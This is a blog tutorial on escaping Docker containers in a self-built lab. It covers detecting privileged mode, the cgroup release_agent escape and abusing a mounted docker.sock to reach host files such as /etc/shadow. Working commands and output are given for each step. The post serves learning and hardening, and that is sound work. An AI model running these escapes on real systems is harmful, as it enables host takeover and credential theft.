+++
title = "Escaping Docker containers for fun and (non)profit"
date = "2021-02-01T21:11:19+02:00"
tags = ["containers", "docker", "escaping", "privesc"]
description = "This post will cover some techniques to escape Docker containers and gain access to the host."
+++

## Table of Contents

- [Check if your container is running as privileged](#check-if-your-container-is-running-as-privileged)
  - [From inside the container](#from-inside-the-container)
  - [From the host](#from-the-host)
- [Exploiting cgroups](#exploiting-cgroups)
  - [Setup a vulnerable container](#setup-a-vulnerable-container)
  - [Exploit the container](#exploit-the-container)
- [Docker API escaping](#docker-api-escaping)
  - [Setting up the lab](#setting-up-the-lab)
  - [Exploit the vulnerable container](#exploit-the-vulnerable-container)


# Check if your container is running as privileged

The very first thing to do is to check if the container you have access to is running as priviledged.

## From inside the container

From inside, it is really easy to do: you just have to try a command that usually requires privileged rights, for example creating a new network interface.

```
$ ip link add dummy0 type dummy
```

In the situation where your container is running with special permissions, you'll see no error. Otherwise, an error will occur, which might looks like this one:

```
ip: RTNETLINK answers: Operation not permitted
```

## From the host

Docker has a command called `inspect` which allow to gather informations about a specific container, thanks to its container ID. First we need to get the container ID:

```
$ docker ps
CONTAINER ID   IMAGE     COMMAND     CREATED         STATUS         PORTS     NAMES
65b7d7b83eb8   alpine    "/bin/sh"   5 minutes ago   Up 5 minutes             amazing_swirles
```

Then, we can inspect the container:

```
$ docker inspect --format='{{.HostConfig.Privileged}}' 65b7d7b83eb8
true
```

As you can see, the container labeled `amazing_swirles`, with ID `65b7d7b83eb8` is running as privileged.

Note that if you are able to run `docker` without using `sudo` on the host, there is an easier way to gain root access.

Spoiler:

```
$ docker run -it -v /:/mount alpine
# ls /mount
bin         etc         lib32       media       root        swapfile    var
boot        home        lib64       mnt         run         sys
cdrom       keybase     libx32      opt         sbin        tmp
dev         lib         lost+found  proc        srv         usr
```
🙃

---

# Exploiting cgroups

This exploit is easy to execute, and can be really efficient, as containers that are running with `--privileged` option are quite common. But before exploitation, we need to setup a vulnerable container to play with !

## Setup a vulnerable container

It is really easy to start a container which is vulnerable:

```
$ docker run -it --privileged alpine
```

This will create a container running with `SYS_ADMIN` capablility.

## Exploit the container

`cgroup` (which stands for control group) is a kernel feature in Linux that allows to limit/protect/isolate the utilisation of resources (by resources, I mean CPU, memory, disk usage...).

A control group is a bunch of processes that are linked together. Those groups can follow a hierarchy, which means that a process can inherit limitations applied to its ancestors' groups.

There is a well-known proof of concept[^1] for escaping containers running with `--privileged`. This is the one I'll use.

It is based on the fact that when the last process in a cgroup ends, the content of `release_agent` is executed. By default, the feature is disabled and the content of `release_agent` is empty, but we will see how simply it is to enable and exploit it.

First, let's create some directories where we will mount a `cgroup` controller named RDMA[^2]:

```
# mkdir /tmp/cgroup
# mount -t cgroup -o rdma cgroup /tmp/cgroup/
# mkdir /tmp/cgroup/x
```

To interact with a `cgroup`, we need to mount the appropriate fs with the desired controllers.
`mount -t` allows us to mount a specific type of filesystem (here a cgroup). `-o` indicates the options: we say here that we want to mount the RDMA controller at the path `/tmp/cgroup`.

And then we create a child cgroup name "x" which will inherit the properties of its parent.

Now, we must enable cgroup notifications on release for the "x" cgroup. This can be done by setting a 1 in `notify_on_release` inside the "x" cgroup:

```
# echo 1 > /tmp/cgroup/x/notify_on_release
```

Then, we must get the location of the `release_agent` file on the host:

```
# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

We can do this because the `root` user in a container is exactly the same `root` user than on the host ! If you want to verify this, you can get the value store in `$host_path` is accessible by your `root` user on the host. In fact, the container filesystem is mounted under `/var/lib/docker` on the host.

Now, let's put the path of the script inside `release_agent`:

```
# echo "$host_path/script" > /tmp/cgroup/release_agent
```

And create the script we want to execute on the host:

```
# echo '#!/bin/sh' > /script
# echo "ls /home/ezekiel > $host_path/result" >> /script
```

Make it executable:

```
# chmod a+x /script
```

And launch a process in the cgroup that will exit instantly:

```
# sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
# head /result -n1
Desktop
```

Et voilà, the host has been pwned !

---

# Docker API escaping

This way of escaping Docker containers will not use the `--privileged` option, but the fact that `/vat/run/docker.sock` has been mounted inside another container. This misconfiguration is not very common, so I'll show it just because it is fun to execute !

## Setting up the lab

As we are going to install tools, I recommend using a container with an image that allows packages installation. I decided to go with `debian:buster-slim` as it is lightweight (around 27MB). Don't forget to mount `docker.sock` 😁

```
$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock debian:buster-slim
Unable to find image 'debian:buster-slim' locally
buster-slim: Pulling from library/debian
a076a628af6f: Pull complete 
Digest: sha256:59678da095929b237694b8cbdbe4818bb89a2918204da7fa0145dc4ba5ef22f9
Status: Downloaded newer image for debian:buster-slim
root@945784f80056:/# 
```

Next, install the tools we'll need:

```
root@945784f80056:/# apt update && apt install curl socat
```

Let's have fun !

## Exploit the vulnerable container

Before beginning to hack our way outside of the container, some explanations are required. When most people are talking about Docker, they are in reality talking about Docker Engine. Docker Engine is a client-server application made of the docker daemon (`dockerd`), an API that programs can use, and the command-line tool `docker` that talks to the daemon using the API. And the file used to talk to the API is, as you may have found, `docker.sock`. So having access to this socket allow an attacker a complete access to the Docker Engine capabilities. Luckily, the API is well-documented[^3].

Let's try to do a simple request from the container:

```
root@945784f80056:/# curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json
[{"Id":"945784f80056c850e3925b58f2ac5580b14b03f5f459a52bd639748631a1e66c","Names":["/jovial_cerf"],"Image":"debian:buster-slim","ImageID":"sha256:589ac6f94be479ab633e3f57adb8d2e4dcbe9afbdb4b155e3ce74e0aae1e00d7","Command":"bash","Created":1612214861,"Ports":[],"Labels":{},"State":"running","Status":"Up 18 minutes","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"8cd9362e40a23b72584db80d74e76eb1a3e33a1f983217f3bf56ab13e4deeedf","EndpointID":"75b63d0dcba4393bd6762528bf2a47b9916ebafc97c53a6b57dc88388060ab46","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
```

We obtain some interesting informations about running containers, such as their names, images, IP addresses, uptime, etc.

It is also possible to inspect a single container, using its ID:

```
root@945784f80056:/# curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/945784f80056/json
```

The output here is massive, so I'll not show it. But you have more complete informations about the container you asked, as the runtime, the paths on the host...

That's very nice, but we can do more :) Let's create another container from our actual one !

Before sending the request, we need to prepare some JSON that will indicate how the container we are going to spawn will behave. It doesn't have to be complex:

```json
{
    "Image": "debian:buster-slim",
    "Cmd": [
        "/bin/bash"
    ],
    "OpenStdin": true,
    "Mounts": [
        {
            "Type": "bind",
            "Source": "/etc/",
            "Target": "/mount"
        }
    ]
}
```

We establish that we want a container using `debian:buster-slim` image (the same that we are currently using in our vulnerable container), and that we want the first command to be `/bin/bash`. Also, we want to mount `/etc` from the host's filesystem to `/mount`.

Note that we could have use the value `"Privileged": true`, but it's not funny 😁

Now, we minify it and store it in `container.json`:

```
root@945784f80056:/# echo -e '{"Image":"debian:buster-slim","Cmd":["/bin/bash"],"OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/mount"}]}' > container.json
```

Then, we post it to `/containers/create` using POST verb:

```
root@945784f80056:/# curl -XPOST --header "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
{"Id":"f7365a47d65b5ff0d372191f0dcb55b9ef5823e51cb1fcd20ff420352d116408","Warnings":[]}
```

The daemon sends back the container ID. We can use it to send a new request to start the container:

```
root@945784f80056:/# curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/f7365a47/start
```

And then use `socat` to send a raw HTTP request:

```
root@945784f80056:/# socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/f7365a47/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

The daemon responds:

```
HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp
```

And from now, we can send commands to the other container !

```
ls
^bin
boot
dev
etc
home
lib
lib64
media
mnt
mount
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

We can see that there is the `/mount` folder we asked for, which contains the content of the `/etc` directory from the host ! 

```
ls mount | grep shadow
 gshadow
gshadow-
shadow
shadow-
```

We're in ! 

As I said at the beginning of this section, this attack is more for demonstration purposes. In fact, there is nothing new here as we just do what I showed in the first part when I was talking about an easy way to get full access on an host using `docker`, except that this time wa did everything from another container using the API.

---

We just have scratched the surface of what we can do with Docker. In reality, there is  a lot more way of hacking with Docker, from inside and outside a container, and old CVEs to play with !

Happy hacking ! 👾

[^1]: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
[^2]: https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/rdma.html
[^3]: https://docs.docker.com/engine/api/